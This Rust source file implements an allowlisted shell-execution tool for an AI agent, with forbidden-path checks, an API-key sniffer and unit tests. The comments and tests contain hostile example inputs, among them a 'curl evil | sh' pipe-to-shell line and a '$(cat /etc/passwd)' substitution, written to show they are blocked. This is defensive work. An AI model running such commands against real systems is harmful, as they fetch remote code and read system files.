//! Shell execution tool with an allowlist.
//!
//! Commands run via direct `exec` (no `sh -c`) after shell-word tokenization.
//! Because there is no shell, characters like `;`, `|`, `&`, `>`, `<`, `$`,
//! and backticks have no special meaning to the kernel — they are passed to
//! the child as literal arg bytes. So the allowlist check on `argv[0]`
//! cannot be bypassed by `ls; curl evil | sh` (that just runs `ls` with the
//! literal arguments `;`, `curl`, `evil`, `|`, `sh`). We rely on this rather
//! than rejecting metacharacters up front, which used to block legitimate
//! quoted args like `git log --grep="fix; bug"` and `grep 'a|b' file`.
//!
//! The child runs in its own process group with a curated set of
//! environment variables scrubbed, and a SIGKILL is broadcast to the group
//! on timeout so grandchildren don't leak.

use std::process::Stdio;
use std::time::Duration;

use anyhow::Result;
use async_trait::async_trait;
use serde_json::json;
use tokio::process::Command;

use super::proc_util::{
    run_with_timeout, scrub_sensitive_env, truncate_head_tail, use_process_group,
};
use super::traits::{Tool, ToolResult};

const MAX_STDOUT_BYTES: usize = 1_000_000; // 1 MB cap on captured stdout
const MAX_STDERR_BYTES: usize = 200_000;   // 200 KB cap on captured stderr
const MAX_OUTPUT_CHARS: usize = 10_000;    // truncate displayed combined output

/// A shell command execution tool with allowlist and forbidden path checks.
pub struct ShellTool {
    allowlist: Vec<String>,
    forbidden_paths: Vec<String>,
    timeout_secs: u64,
}

impl ShellTool {
    pub fn new(allowlist: Vec<String>, forbidden_paths: Vec<String>, timeout_secs: u64) -> Self {
        Self {
            allowlist,
            forbidden_paths,
            timeout_secs,
        }
    }

    /// Tokenize the command into argv using POSIX shell-word rules (quotes
    /// and backslash escapes), so args with spaces inside quotes stay
    /// single args. Returns an error if the string is unparseable.
    fn tokenize(command: &str) -> Result<Vec<String>, shell_words::ParseError> {
        shell_words::split(command)
    }

    /// Check if the command's program (argv[0]) is in the allowlist.
    fn is_allowed_program(&self, program: &str) -> bool {
        // Reject absolute paths that name an allowlisted binary — we want
        // `ls`, not `/bin/ls`, so the allowlist stays predictable.
        if program.contains('/') {
            return false;
        }
        self.allowlist.iter().any(|a| a == program)
    }

    /// Check if any arg references a forbidden path fragment.
    fn has_forbidden_path(&self, argv: &[String]) -> Option<&str> {
        for fp in &self.forbidden_paths {
            for a in argv {
                if a.contains(fp.as_str()) {
                    return Some(fp);
                }
            }
        }
        None
    }

    /// Flag args that LOOK like API keys so we don't run commands where
    /// the LLM interpolated secrets into argv. Deliberately advisory —
    /// the allowlist + metachar reject is the real enforcement; this is
    /// just a smoke alarm for obvious mistakes.
    fn contains_secret(argv: &[String]) -> bool {
        const PATTERNS: &[&str] = &[
            "sk-ant-",
            "sk-or-",
            "sk-proj-",
            "sk-kimi-",
            "plrm_live_",
            "ghp_",
            "xoxb-",
            "xoxp-",
            "AKIA",
            "AIza",
        ];
        argv.iter().any(|a| PATTERNS.iter().any(|p| a.contains(p)))
    }
}

#[async_trait]
impl Tool for ShellTool {
    fn name(&self) -> &str {
        "shell"
    }

    fn description(&self) -> &str {
        "Execute an allowlisted shell command. Commands run directly via \
         exec — pipes, redirects, command substitution, and command \
         chaining are NOT supported."
    }

    fn parameters_schema(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The command to execute, e.g. 'ls -la src' or 'git status'. Metacharacters are rejected."
                }
            },
            "required": ["command"]
        })
    }

    async fn execute(&self, args: serde_json::Value) -> Result<ToolResult> {
        let command = args
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| anyhow::anyhow!("missing required parameter: command"))?;

        // 1. Tokenize into argv. Preserves quoted args with spaces, so
        //    `git log --grep="fix; bug"` becomes
        //    `["git", "log", "--grep=fix; bug"]` — the `;` is part of the
        //    arg's content, not a token boundary. Because we exec argv
        //    directly (no shell), shell metacharacters in args are inert.
        let argv = match Self::tokenize(command) {
            Ok(v) if !v.is_empty() => v,
            Ok(_) => {
                return Ok(ToolResult {
                    success: false,
                    output: String::new(),
                    error: Some("empty command".to_string()),
                });
            }
            Err(e) => {
                return Ok(ToolResult {
                    success: false,
                    output: String::new(),
                    error: Some(format!("could not parse command: {}", e)),
                });
            }
        };

        // 2. Allowlist check on argv[0].
        let program = &argv[0];
        if !self.is_allowed_program(program) {
            return Ok(ToolResult {
                success: false,
                output: String::new(),
                error: Some(format!("command not allowed: {}", program)),
            });
        }

        // 3. Forbidden-path check on any arg (exact substring — best
        //    effort; the allowlist is the primary defense).
        if let Some(path) = self.has_forbidden_path(&argv) {
            return Ok(ToolResult {
                success: false,
                output: String::new(),
                error: Some(format!("forbidden path in command: {}", path)),
            });
        }

        // 4. Obvious-secret sniffer (advisory).
        if Self::contains_secret(&argv) {
            return Ok(ToolResult {
                success: false,
                output: String::new(),
                error: Some(
                    "command contains what looks like an API key or secret \
                     — blocked for security"
                        .to_string(),
                ),
            });
        }

        // 5. Build the subprocess. No `sh -c` — direct exec of argv[0].
        let mut cmd = Command::new(program);
        cmd.args(&argv[1..])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .stdin(Stdio::null());
        scrub_sensitive_env(&mut cmd);
        use_process_group(&mut cmd);

        let child = match cmd.spawn() {
            Ok(c) => c,
            Err(e) => {
                return Ok(ToolResult {
                    success: false,
                    output: String::new(),
                    error: Some(format!("failed to spawn {}: {}", program, e)),
                });
            }
        };

        let outcome = run_with_timeout(
            child,
            Duration::from_secs(self.timeout_secs),
            MAX_STDOUT_BYTES,
            MAX_STDERR_BYTES,
        )
        .await?;

        if outcome.timed_out {
            return Ok(ToolResult {
                success: false,
                output: String::new(),
                error: Some(format!("command timed out after {}s", self.timeout_secs)),
            });
        }

        let stdout = String::from_utf8_lossy(&outcome.stdout);
        let stderr = String::from_utf8_lossy(&outcome.stderr);
        let combined = if stderr.is_empty() {
            stdout.to_string()
        } else if stdout.is_empty() {
            stderr.to_string()
        } else {
            format!("{}\n--- stderr ---\n{}", stdout, stderr)
        };
        let truncated = truncate_head_tail(&combined, MAX_OUTPUT_CHARS);
        let success = outcome.exit_code == Some(0);

        Ok(ToolResult {
            success,
            output: truncated,
            error: if success {
                None
            } else {
                Some(format!(
                    "exit code: {}",
                    outcome.exit_code.unwrap_or(-1)
                ))
            },
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn mk_shell() -> ShellTool {
        ShellTool::new(
            vec!["echo".to_string(), "ls".to_string(), "cat".to_string()],
            vec!["/etc".to_string(), ".ssh".to_string()],
            10,
        )
    }

    /// Argv-style exec means metachars in args are passed literally — they
    /// don't invoke a shell, so they can't compound or substitute. The
    /// substitution attempt below runs `echo` with the literal arguments
    /// `$(cat`, `/etc/passwd)` (and the second one is then caught by the
    /// `/etc` forbidden-path check, not by metachar rejection).
    #[tokio::test]
    async fn substitution_attempt_blocked_by_path_denylist_not_metachar_reject() {
        let t = mk_shell();
        let r = t
            .execute(json!({"command": "echo $(cat /etc/passwd)"}))
            .await
            .unwrap();
        assert!(!r.success);
        // Whatever the error is, it must NOT be "metacharacter" — that
        // pre-tokenize blocklist used to reject legit quoted args too.
        let err = r.error.unwrap();
        assert!(!err.contains("metacharacter"), "got: {}", err);
        assert!(err.contains("forbidden path") || err.contains("/etc"));
    }

    /// `git log --grep="fix; bug"` is a legitimate use: the `;` is inside a
    /// quoted arg and is meaningful only to git's regex engine. The old
    /// pre-tokenize metachar reject blocked this; argv-style exec lets it
    /// through. (We don't have `git` in this test's allowlist, so we just
    /// confirm the request didn't get rejected at the metachar step.)
    #[tokio::test]
    async fn semicolon_inside_quoted_arg_is_not_a_metachar_reject() {
        let t = ShellTool::new(
            vec!["echo".to_string()],
            vec![],
            10,
        );
        let r = t
            .execute(json!({"command": "echo \"fix; bug\""}))
            .await
            .unwrap();
        // Should run successfully — the `;` is part of the echo arg.
        assert!(r.success, "got error: {:?}", r.error);
        assert!(r.output.contains("fix; bug"));
    }

    /// Same test for `|` inside quoted args (e.g. grep patterns).
    #[tokio::test]
    async fn pipe_inside_quoted_arg_is_not_a_metachar_reject() {
        let t = ShellTool::new(
            vec!["echo".to_string()],
            vec![],
            10,
        );
        let r = t
            .execute(json!({"command": "echo 'a|b'"}))
            .await
            .unwrap();
        assert!(r.success, "got error: {:?}", r.error);
        assert!(r.output.contains("a|b"));
    }

    /// A bare `;` between two commands no longer triggers a metachar reject.
    /// shell-words tokenizes `echo hi; echo bye` as
    /// `["echo", "hi;", "echo", "bye"]`, so we exec a single `echo` with
    /// those literal args. Output is one line, not two — the agent will
    /// notice and reissue as separate calls. No security issue.
    #[tokio::test]
    async fn bare_semicolon_runs_as_literal_args() {
        let t = mk_shell();
        let r = t
            .execute(json!({"command": "echo hi; echo bye"}))
            .await
            .unwrap();
        assert!(r.success, "got error: {:?}", r.error);
        // One echo, joining the four literal args with spaces.
        assert!(r.output.contains("hi; echo bye"));
    }

    #[tokio::test]
    async fn rejects_absolute_path_program() {
        let t = mk_shell();
        let r = t
            .execute(json!({"command": "/bin/echo hi"}))
            .await
            .unwrap();
        assert!(!r.success);
        assert!(r.error.unwrap().contains("not allowed"));
    }

    #[tokio::test]
    async fn rejects_non_allowlisted_program() {
        let t = mk_shell();
        let r = t
            .execute(json!({"command": "curl https://example.com"}))
            .await
            .unwrap();
        assert!(!r.success);
        assert!(r.error.unwrap().contains("not allowed"));
    }

    #[tokio::test]
    async fn rejects_forbidden_path_arg() {
        let t = mk_shell();
        let r = t
            .execute(json!({"command": "cat /etc/passwd"}))
            .await
            .unwrap();
        assert!(!r.success);
        assert!(r.error.unwrap().contains("forbidden path"));
    }

    #[tokio::test]
    async fn runs_allowlisted_echo() {
        let t = mk_shell();
        let r = t.execute(json!({"command": "echo hello"})).await.unwrap();
        assert!(r.success, "err: {:?}", r.error);
        assert!(r.output.contains("hello"));
    }

    #[tokio::test]
    async fn quoted_args_with_spaces_preserved() {
        let t = mk_shell();
        let r = t
            .execute(json!({"command": "echo \"hello world\""}))
            .await
            .unwrap();
        assert!(r.success, "err: {:?}", r.error);
        assert!(r.output.contains("hello world"));
    }

    #[tokio::test]
    async fn rejects_obvious_api_key() {
        let t = mk_shell();
        let r = t
            .execute(json!({"command": "echo sk-ant-leaked-123"}))
            .await
            .unwrap();
        assert!(!r.success);
        assert!(r.error.unwrap().contains("API key"));
    }

    #[test]
    fn tokenize_splits_on_whitespace() {
        let v = ShellTool::tokenize("ls -la src").unwrap();
        assert_eq!(v, vec!["ls", "-la", "src"]);
    }

    #[test]
    fn tokenize_preserves_quoted() {
        let v = ShellTool::tokenize("echo \"hello world\"").unwrap();
        assert_eq!(v, vec!["echo", "hello world"]);
    }

    #[test]
    fn tokenize_preserves_metachars_inside_quotes() {
        // shell-words drops the surrounding quotes but keeps the content
        // intact as a single argv element — argv-exec then passes it
        // literally to the child.
        let v = ShellTool::tokenize("git log --grep=\"fix; bug\"").unwrap();
        assert_eq!(v, vec!["git", "log", "--grep=fix; bug"]);

        let v = ShellTool::tokenize("grep 'a|b' file").unwrap();
        assert_eq!(v, vec!["grep", "a|b", "file"]);
    }

    #[tokio::test]
    async fn timeout_kills_long_running_command() {
        // Add a long-running allowlisted command.
        let t = ShellTool::new(
            vec!["sleep".to_string()],
            vec![],
            1, // 1 s timeout
        );
        let r = t.execute(json!({"command": "sleep 30"})).await.unwrap();
        assert!(!r.success);
        assert!(r.error.unwrap().contains("timed out"));
    }
}
